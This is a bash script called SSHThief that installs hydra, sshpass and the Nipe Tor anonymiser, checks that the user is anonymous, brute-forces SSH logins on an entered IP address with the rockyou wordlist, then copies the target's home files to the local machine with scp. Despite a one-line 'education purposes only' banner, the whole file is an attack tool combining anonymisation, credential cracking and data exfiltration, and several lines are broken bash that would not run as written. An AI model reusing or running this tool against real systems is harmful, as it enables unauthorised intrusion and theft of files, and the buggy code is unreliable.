#!/bin/bash

#######################
### SSHTHIEF FUNCTIONS
#######################

# INSTALL(): automatically installs relevant applications on user host and creates relevant directories
# ANON(): executes Nipe anonymiser and conducts an anonymity check
# SSHCRACK(): collects user input for VPS address and executes a hydra brute-force attack
# SCP(): access VPS, and secure copy (scp) all the directories and files from the VPS onto the local host

#####################
### INSTALL FUNCTION
#####################

### DEFINITION

function INSTALL()
{
	### START
	# let the user know that SSHThief is starting
	echo " "
	echo "[*] SSHThief is starting..."
	echo " "
	echo "[*] Installing and updating applications on your local computer..."
	echo " "
	echo "[*] Creating new directory: ~/SSHThief..."
	echo " "
	
	### APT UPDATE
	# update APT packages
	sudo apt-get -y update
	sudo apt-get -y upgrade
	sudo apt-get -y dist-upgrade
	
	### DIRECTORY
	# create a directory to contain output files later
	cd ~
	mkdir SSHThief
	cd ~/SSHThief
	echo "[+] Directory created: ~/SSHThief"
	echo " "
	
  	### FIGLET INSTALLATION
	# install figlet for aesthetic purposes
	mkdir figrc
	cd ~/SSHThief/figrc
	sudo apt-get -y install figlet
	# install cybermedium figlet font; credits: http://www.figlet.org
	wget http://www.jave.de/figlet/fonts/details/cybermedium.flf
	cd ~/SSHThief
	
	### CORE APPLICATIONS INSTALLATION
	# install relevant applications
	sudo apt-get -y install wordlists
	sudo apt-get -y install ssh
	sudo apt-get -y install sshpass
	sudo apt-get -y install hydra
	sudo apt-get install tor
	git clone https://github.com/htrgouvea/nipe.git 
	cd ~/SSHThief/nipe 
	sudo cpan install Try:Tiny Config::Simple JSON
	sudo perl nipe.pl install
	
	### END
	# let the user know applications are installed
	echo " "
	echo "[+] Applications installed and updated."
	echo "	"
}

### EXECUTION
INSTALL

########
### SCP
########

### DEFINITION
function SCP()
{
	### START
	echo " "
	echo "[+] Connected to $vpsip."
	echo " "
	echo "[*] Copying target file system..."
	echo " "
	# create directory to store file system
	cd ~/SSHThief/$vpsip
	mkdir ~/SSHThief/$vpsip/system
	cd ~/SSHThief/$vpsip/system
	
	### ACCESS AND COPY
	sshpass -p "$vpspass" scp "$vpsuser"@"$vpsip":~/* ~/SSHThief/$vpsip/system 2> /dev/null
	echo " "
	echo "[+] Target file system has been copied onto the directory: ~/SSHThief/$vpsip/system"
	
	### END
	exit
}

#############
### SSHCRACK
#############

### DEFINITION
function SSHCRACK()
{
	### START
	# display figlet for aesthetics, with short description of program
	figlet -c -f ~/SSHThief/figrc/cybermedium.flf -t "SSHTHIEF"
	echo " "
	echo "[*] This program is for testing the basic network security of a VPS. Please use for penetration testing and education purposes only."
	echo " "
	echo "[!] Press Ctrl-C to exit."
	echo " "
	
	### VPS ADDRESS INPUT
	read -p "[!] Enter VPS IP Address: " vpsip
	cd ~/SSHThief
	mkdir $vpsip
	cd ~/SSHThief/$vpsip
	echo " "
	echo "[+] Directory created: ~/SSHThief/$vpsip"
	echo " "
	
	# WORDLIST CONFIGURATION
	echo "[*] Configuring Wordlists..."
	cd ~/SSHThief/$vpsip
	mkdir wordlist
	cd ~/usr/share/wordlists
	sudo gunzip rockyou.txt
	sudo cat rockyou.txt > wordlist.txt
	sudo sed -i '1i root' wordlist.txt
	sudo mv wordlist.txt ~/SSHThief/$vpsip/wordlist
	cd ~/SSHThief/$vpsip/wordlist
	WordList = ~/SSHThief/$vpsip/wordlist/wordlist.txt
	echo "[+] Wordlist created: ~/SSHThief/$vpsip/wordlist/wordlist.txt"
	echo " "
	cd ~/SSHThief
	
	### BRUTE-FORCE ATTACK
	echo "[*] Executing Hydra Brute-Force Attack via SSH protocol..."  
	echo " "
	sudo hydra -L $WordList -P $WordList $vpsip ssh -t 4 -vV > crackedusers.txt
	# if attack succeeds, select cracked user and call the SCP function
	crackstatus = $(cat crackedusers.txt | grep host: | awk '{print $2}')
	if [ "$crackstatus" == "host:" ]
		### DISPLAY OF CRACKED USERS
		# let user know about the number and details of cracked users to choose from
		echo "[+] Attack successful:"
		echo "[+] $(cat crackedusers.txt | grep host: | wc -l) Cracked Users: (Format: <username> <password>)"
		echo "$(cat crackedusers.txt | grep host: | awk '{print $5, $7}')"
		echo " "
		
		### SELECTION OF CRACKED USER
		read -p "[!] Enter the cracked user you want to access as:" $vpsuser
		echo " "
		readp -p "[!] Enter the password of the cracked user: " $vpspass
		echo " "
		echo "[*] Connecting to $vpsip now..."
		# execute SCP function
		SCP
	else
		### EXIT
		echo "[-] Attack unsuccessful. Exiting program now..."
		exit
	fi
}

#########
### ANON
#########

### DEFINITION
function ANON()
{
	### START
	# let the user know anonymity check is starting
	echo " "
	echo "[*] Conducting Anonymity Check..."
	echo " "
	
	### ANONYMISATION
	# execute nipe in nipe folder
	cd ~/SSHThief/nipe
	sudo perl nipe.pl start
	
	### ANONYMITY CHECK
	sudo perl nipe.pl status
	# if nipestatus shows "activated", user is anonymous
	nipestatus = $(sudo perl nipe.pl status | grep activated | awk '{print $3}' | awk -F. '{print $1}')
	if [ "$nipestatus" == "activated" ]
	then
		# tell user that he is anonymous
		echo " "
		echo "[+] ANONYMITY CHECK: You are currently anonymous."
		echo " "
		# after anonymity check, call the SSHCRACK function
		SSHCRACK
	else
		# tell user that he is not anonymous, and exit script
		echo " "
		echo "[-] ANONYMITY CHECK: You are currently not anonymous."
		echo " "
		echo "[-] Error in activating nipe. Exiting now..."
		echo " "
		exit
	fi	
}

# EXECUTION
ANON

